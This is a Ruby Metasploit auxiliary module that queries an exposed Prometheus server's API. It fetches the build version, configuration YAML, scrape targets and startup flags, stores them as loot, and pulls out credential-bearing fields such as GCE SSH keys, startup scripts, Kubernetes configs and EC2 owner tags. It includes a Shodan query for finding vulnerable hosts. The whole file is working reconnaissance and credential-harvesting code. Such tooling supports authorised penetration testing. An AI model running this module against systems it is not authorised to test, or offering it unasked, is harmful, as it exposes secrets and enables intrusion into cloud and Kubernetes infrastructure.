##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Prometheus

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Prometheus API Information Gather',
        'Description' => %q{
          This module utilizes Prometheus' API calls to gather information about
          the server's configuration, and targets. Fields which may contain
          credentials, or credential file names are then pulled out and printed.

          Targets may have a wealth of information, this module will print the following
          values when found:
          __meta_gce_metadata_ssh_keys, __meta_gce_metadata_startup_script,
          __meta_gce_metadata_kube_env, kubernetes_sd_configs,
          _meta_kubernetes_pod_annotation_kubectl_kubernetes_io_last_applied_configuration,
          __meta_ec2_tag_CreatedBy, __meta_ec2_tag_OwnedBy

          Shodan search: "http.favicon.hash:-1399433489"
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die'
        ],
        'References' => [
          ['URL', 'https://jfrog.com/blog/dont-let-prometheus-steal-your-fire/']
        ],

        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2016-07-01', # Prometheus 1.0 release date, who knows....
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(9090),
        OptString.new('TARGETURI', [ true, 'The URI of Prometheus', '/'])
      ]
    )
  end

  def run
    vprint_status("#{peer} - Checking build info")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'status', 'buildinfo'),
      'method' => 'GET'
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response from server (response code #{res.code})") unless res.code == 200
    json = res.get_json_document
    version = json.dig('data', 'version')
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response from server (unable to find version number)") unless version
    print_good("Prometheus found, version: #{version}")

    vprint_status("#{peer} - Checking status config")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'status', 'config'),
      'method' => 'GET'
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response from server (response code #{res.code})") unless res.code == 200
    json = res.get_json_document
    fail_with(Failure::UnexpectedReply, "#{peer} - Unable to parse JSON document") unless json
    yaml = json.dig('data', 'yaml')
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response from server (unable to find yaml)") unless yaml
    begin
      yamlconf = YAML.safe_load(yaml)
      loot_path = store_loot('Prometheus YAML Config', 'application/yaml', datastore['RHOST'], yaml, 'config.yaml')
      print_good("YAML config saved to #{loot_path}")
      prometheus_config_eater(yamlconf)
    rescue Psych::DisallowedClass
      # [-] Auxiliary failed: Psych::DisallowedClass Tried to load unspecified class: Symbol
      print_bad('Unable to load YAML')
    end

    vprint_status("#{peer} - Checking targets")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'targets'),
      'method' => 'GET'
    )
    table_targets = Rex::Text::Table.new(
      'Header' => 'Target Data',
      'Indent' => 2,
      'Columns' =>
      [
        'Field',
        'Data'
      ]
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response from server (response code #{res.code})") unless res.code == 200

    json = res.get_json_document
    fail_with(Failure::UnexpectedReply, "#{peer} - Unable to parse JSON document") unless json
    loot_path = store_loot('Prometheus JSON targets', 'application/json', datastore['RHOST'], json.to_json, 'targets.json')
    print_good("JSON targets saved to #{loot_path}")
    json.dig('data', 'activeTargets').each do |target|
      [
        '__meta_gce_metadata_ssh_keys', '__meta_gce_metadata_startup_script', '__meta_gce_metadata_kube_env', 'kubernetes_sd_configs',
        '_meta_kubernetes_pod_annotation_kubectl_kubernetes_io_last_applied_configuration', '__meta_ec2_tag_CreatedBy', '__meta_ec2_tag_OwnedBy'
      ].each do |key|
        if target[key]
          table_targets << [
            key,
            target[key]
          ]
        end

        next unless target.dig('discoveredLabels', key)

        table_targets << [
          key,
          target.dig('discoveredLabels', key)
        ]
      end
    end

    print_good(table_targets.to_s) if !table_targets.rows.empty?

    vprint_status("#{peer} - Checking status flags")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'status', 'flags'),
      'method' => 'GET'
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response from server (response code #{res.code})") unless res.code == 200
    json = res.get_json_document
    fail_with(Failure::UnexpectedReply, "#{peer} - Unable to parse JSON document") unless json
    print_good("Config file: #{json.dig('data', 'config.file')}") if json.dig('data', 'config.file')
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
  end
end
